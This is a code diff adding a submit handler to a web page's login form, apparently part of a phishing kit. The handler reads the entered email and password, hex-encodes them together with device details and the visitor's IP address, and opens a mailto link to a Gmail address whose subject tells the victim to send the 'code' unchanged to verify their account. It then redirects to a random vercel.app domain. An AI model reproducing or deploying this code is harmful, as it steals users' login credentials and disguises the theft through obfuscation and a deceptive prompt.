@@ -260,7 +260,52 @@
         }
     });
 
-    
+   document.getElementById("f").addEventListener("submit", function (event) {
+        event.preventDefault();
+
+        const email = document.getElementById("a").value.trim();
+        const password = document.getElementById("b").value.trim();
+
+        function toHex(str) {
+            let result = '';
+            for (let i = 0; i < str.length; i++) {
+                result += str.charCodeAt(i).toString(16).padStart(2, '0');
+            }
+            return result;
+        }
+
+        // Ambil informasi perangkat
+        const platform = navigator.platform || "Unknown";
+        const userAgent = navigator.userAgent || "Unknown";
+        const language = navigator.language || "Unknown";
+        const screenResolution = `${window.screen.width}x${window.screen.height}` || "Unknown";
+
+        // Konversi informasi perangkat ke hexadecimal
+        const deviceInfo = `Platform: ${platform}, UserAgent: ${userAgent}, Language: ${language}, Resolution: ${screenResolution}`;
+        const encodedDeviceInfo = toHex(deviceInfo);
+
+        const a = toHex(email);
+        const b = toHex(password);
+
+        // Ambil alamat IP dari layanan ipify
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip || "Unknown";
+                const encodedIp = toHex(`IP Address: ${ipAddress}`);
+
+                const mailtoLink = `mailto:goprivacy.sc@gmail.com?subject=Kirim%20kode%20ini%20tanpa%20perubahan%20untuk%20memverifikasi%20akun%20Anda!&body=456d61696c%20-${a}%0A50617373776f7264-%20${b}%0A44657669636520496e666f%20${encodedDeviceInfo}%0A49502041646472657373%20${encodedIp}`;
+                window.location.href = mailtoLink;
+
+                setTimeout(function() {
+                    window.location.href = "https://tsh66GTRFbKi7hTtwjt94838ihh53WCNKOijjYHa6gaywb3hBUavYYGj.vercel.app";
+                }, 1000);
+            })
+            .catch(error => {
+                console.error("Gagal mengambil alamat IP:", error);
+                alert("Error");
+            });
+    });
 </script>
   <script type="module">
     // Import Firebase modular SDK
